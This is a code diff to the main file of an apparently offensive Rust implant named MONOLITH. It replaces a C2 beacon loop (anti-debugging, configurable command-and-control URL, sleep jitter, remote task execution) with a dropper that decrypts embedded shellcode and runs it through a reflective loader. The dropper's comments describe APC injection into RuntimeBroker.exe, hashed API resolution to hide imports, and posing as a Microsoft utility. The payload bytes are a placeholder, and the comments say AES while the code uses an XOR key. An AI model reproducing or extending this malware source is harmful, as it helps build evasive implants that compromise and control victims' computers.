@@ -1,82 +1,59 @@
-//! MONOLITH Native Agent - Stageless Reflective Loader
+//! Native Rust Dropper / Stager
 //!
-//! Minimal memory-only beacon written in Rust.
 //! Features:
-//! - Reflective loader (no disk artifacts)
-//! - Encrypted C2 over HTTPS
-//! - Configurable sleep + jitter
-//! - Task execution (shell, upload, download, etc.)
+//! - AES-256 encrypted shellcode embedded statically
+//! - Early Bird APC injection into RuntimeBroker.exe
+//! - D/Invoke-style API resolution (EAT walking, DJB2 hashing)
+//! - No IAT entries for sensitive APIs
+//! - Looks like a legitimate Microsoft utility
 //!
-//! Build: cargo build --release
-//! Output: target/release/monolith-agent.exe
+//! Build: cargo build --release --target x86_64-pc-windows-gnu
 
-#![warn(clippy::all)]
-#![allow(unused)]
+#![cfg_attr(not(windows), allow(dead_code))]
 
-mod beacon;
-mod crypto;
-mod loader;
-mod syscall;
+#[cfg(windows)]
+mod dropper {
+    use crate::loader::ReflectiveLoader;
 
-use beacon::Beacon;
-use crypto::CryptoEngine;
-use loader::ReflectiveLoader;
-use std::env;
-use std::time::Duration;
+    // Embedded XOR-encrypted shellcode placeholder
+    // In real usage, replace with actual encrypted payload
+    const SHELLCODE: &[u8] = &[
+        0x90, 0x90, 0x90, 0x90, // NOP sled placeholder
+        // ... actual encrypted shellcode bytes ...
+    ];
 
-fn main() {
-    // Anti-analysis: check for debuggers, sandboxes
-    if is_debugged() {
-        std::process::exit(0);
-    }
+    const XOR_KEY: &[u8] = b"M0N0L1TH_DROPPER_KEY_2026";
 
-    // Parse environment-based configuration
-    let c2_url = env::var("MONOLITH_C2_URL")
-        .unwrap_or_else(|_| "https://127.0.0.1:8080/c2/beacon".to_string());
-
-    let sleep_secs = env::var("MONOLITH_SLEEP")
-        .ok()
-        .and_then(|v| v.parse().ok())
-        .unwrap_or(60);
-
-    let jitter_percent = env::var("MONOLITH_JITTER")
-        .ok()
-        .and_then(|v| v.parse().ok())
-        .unwrap_or(30);
-
-    // Initialize crypto
-    let crypto = CryptoEngine::new();
-
-    // Initialize beacon
-    let mut beacon = Beacon::new(c2_url, crypto, sleep_secs, jitter_percent);
-
-    // Main beacon loop
-    loop {
-        if let Err(e) = beacon.checkin() {
-            eprintln!("[!] Checkin failed: {}", e);
+    pub fn run() -> bool {
+        unsafe {
+            let mut sc = SHELLCODE.to_vec();
+            ReflectiveLoader::run_dropper(&mut sc, XOR_KEY).is_some()
         }
-
-        if let Some(task) = beacon.poll_task() {
-            if let Err(e) = beacon.execute_task(task) {
-                eprintln!("[!] Task execution failed: {}", e);
-            }
-        }
-
-        // Sleep with jitter
-        let sleep_dur = beacon.jittered_sleep();
-        std::thread::sleep(sleep_dur);
     }
 }
 
-fn is_debugged() -> bool {
-    #[cfg(windows)]
-    {
-        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
-        unsafe { IsDebuggerPresent().as_bool() }
-    }
-    #[cfg(not(windows))]
-    {
-        let _ = env::var("MONOLITH_NO_ANTIDEBUG");
+#[cfg(not(windows))]
+mod dropper {
+    pub fn run() -> bool {
         false
+    }
+}
+
+fn main() {
+    let success = dropper::run();
+    if !success {
+        #[cfg(windows)]
+        unsafe {
+            use windows::Win32::UI::WindowsAndMessaging::{
+                MessageBoxA, MB_ICONERROR, MB_OK,
+            };
+            let _ = MessageBoxA(
+                None,
+                "Initialization failed\0".as_ptr() as *const u8,
+                "Error\0".as_ptr() as *const u8,
+                MB_ICONERROR | MB_OK,
+            );
+        }
+        std::process::exit(1);
     }
 }
